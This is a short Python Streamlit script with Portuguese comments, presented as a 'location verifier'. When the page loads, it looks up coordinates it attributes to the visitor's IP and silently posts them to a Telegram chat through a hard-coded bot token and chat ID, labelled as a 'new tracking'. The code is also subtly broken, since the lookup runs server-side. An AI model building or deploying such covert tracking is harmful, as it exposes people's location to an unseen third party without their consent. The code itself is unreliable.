import streamlit as st
import requests
import time

# --- SUAS CONFIGURAÇÕES ---
TELEGRAM_TOKEN = '8928445785:AAElqSFTHYlNwUih7KYeNrBQQv2dVdzCjZY'
CHAT_ID = '7273605636'

st.title("📍 Verificador de Localização")
st.write("Aguardando conexão...")

def get_location():
    try:
        # Pega a localização baseada no IP do visitante
        resp = requests.get("https://ip-api.com/json/?fields=lat,lon,status,message")
        data = resp.json()
        
        if data.get('status') == 'success':
            lat = data['lat']
            lon = data['lon']
            return f"📍 Lat: {lat}, Lon: {lon}"
        else:
            return f"❌ Erro: {data.get('message', 'Indisponível')}"
    except Exception as e:
        return f"❌ Falha: {str(e)}"

# Executa uma vez quando a página carrega
loc = get_location()
st.success(f"Localização capturada:\n{loc}")

# Envia para o Telegram
url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
payload = {'chat_id': CHAT_ID, 'text': f"Novo rastreamento:\n{loc}"}
try:
    requests.post(url, data=payload)
except:
    pass

# Mantém a página aberta por uns segundos para garantir que o envio foi feito
time.sleep(5)